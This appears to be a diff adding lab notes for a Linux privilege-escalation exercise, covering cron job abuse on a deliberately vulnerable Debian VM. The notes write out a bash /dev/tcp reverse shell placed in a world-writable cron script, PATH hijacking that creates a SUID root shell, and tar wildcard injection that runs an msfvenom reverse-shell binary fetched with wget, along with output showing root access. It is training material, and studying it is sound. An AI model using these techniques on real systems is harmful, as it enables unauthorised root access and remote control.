@@ -1,6 +1,8 @@
 
 export IP: 10.10.250.170
 
+===
+Deploy the Vulnerable Debian VM
 
 Prechecks:
 
@@ -385,4 +387,292 @@ Read and follow along with the above.
 
 
 ====
+Cron Jobs - File Permissions
+
+Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.
+
+View the contents of the system-wide crontab:
+
+```
+cat /etc/crontab
+
+user@debian:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+user@debian:~$ 
+
+```
+
+
+There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
+
+```
+
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+```
+
+Locate the full path of the overwrite.sh file:
+
+locate overwrite.sh
+
+Note that the file is world-writable:
+
+ls -l /usr/local/bin/overwrite.sh
+
+```
+
+user@debian:~$ locate overwrite.sh
+locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 818.6 days)
+/usr/local/bin/overwrite.sh
+user@debian:~$ ls -l /usr/local/bin/overwrite.sh
+-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
+user@debian:~$ 
+
+```
+
+Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
+
+
+
+```
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+
+
+
+user@debian:~$ nano /usr/local/bin/overwrite.sh 
+bash -i >& /dev/tcp/10.2.77.171/4444 0>&1
+#echo `date` > /tmp/useless
+
+```
+
+Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
+
+nc -nvlp 4444
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 4444       
+listening on [any] 4444 ...
+connect to [10.2.77.171] from (UNKNOWN) [10.10.217.88] 49697
+bash: no job control in this shell
+root@debian:~# whoami
+whoami
+root
+root@debian:~# pwd 
+pwd
+/root
+root@debian:~# echo $SHELL
+echo $SHELL
+/bin/sh
+root@debian:~# exit
+exit
+exit
+                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ 
+
+```
+
+===
+Cron Jobs - PATH Environment Variable
+
+View the contents of the system-wide crontab:
+
+```
+cat /etc/crontab
+
+user@debian:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+```
+
+Note that the PATH variable starts with /home/user which is our user's home directory.
+
+Create a file called overwrite.sh in your home directory with the following contents:
+
+```
+rootbash-4.1# nano overwrite.sh
+
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+
+```
+
+Make sure that the file is executable:
+
+```
+user@debian:~$ chmod +x overwrite.sh 
+
+```
+
+Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
+
+```
+/tmp/rootbash -p
+
+user@debian:~$ /tmp/rootbash -p
+rootbash-4.1# whoami
+root
+rootbash-4.1# echo $SHELL
+/bin/bash
+rootbash-4.1# 
+
+```
+
+Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!
+
+```
+rm /tmp/rootbash
+exit
+```
+
+What is the value of the PATH variable in /etc/crontab?
+/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+
+===
+Cron Jobs - Wildcards
+
+View the contents of the other cron job script:
+
+```
+cat /usr/local/bin/compress.sh
+
+user@debian:~$ cat /usr/local/bin/compress.sh 
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+user@debian:~$ 
+
+```
+
+Note that the tar command is being run with a wildcard (_*_) in your home directory.
+
+Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.
+
+Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
+
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+
+
+┌──(kali㉿kali)-[~/ken/brainstack/linuxprivsec]
+└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.2.77.171 LPORT=4444 -f elf -o shell.elf
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+Saved as: shell.elf
+
+```
+Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
+
+`chmod +x /home/user/shell.elf`
+
+Create these two files in /home/user:
+
+`touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf`
+
+```
+user@debian:~$ wget "http://10.2.77.171:8080/shell.elf"
+--2022-08-11 23:00:06--  http://10.2.77.171:8080/shell.elf
+Connecting to 10.2.77.171:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 194 [application/octet-stream]
+Saving to: “shell.elf”
+
+100%[=============================================================================>] 194         --.-K/s   in 0s      
+
+2022-08-11 23:00:07 (40.2 MB/s) - “shell.elf” saved [194/194]
+
+user@debian:~$ ls
+myvpn.ovpn  overwrite.sh  shell.elf  tools
+user@debian:~$ chmod +x shell.elf 
+user@debian:~$ 
+
+
+```
+
+```
+
+user@debian:~$ touch /home/user/--checkpoint=1                    
+user@debian:~$ pwd
+/home/user
+user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf
+user@debian:~$ 
+
+```
+
+When the tar command in the cron job runs, the wildcard * will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+
+Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
+
+`nc -nvlp 4444`
+
+```
+
+┌──(kali㉿kali)-[~/ken/brainstack/linuxprivsec]
+└─$ nc -lnvp 4444                                                                           
+listening on [any] 4444 ...
+connect to [10.2.77.171] from (UNKNOWN) [10.10.217.88] 49768
+whoami
+root
+pwd
+/home/user
+echo $SHELL
+/bin/bash
+
+```
+
+
+Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:
+
+`rm /home/user/shell.elf
+rm /home/user/--checkpoint=1
+rm /home/user/--checkpoint-action=exec=shell.elf
+`
+
+===
+TERMINATED MACHINE
+
 
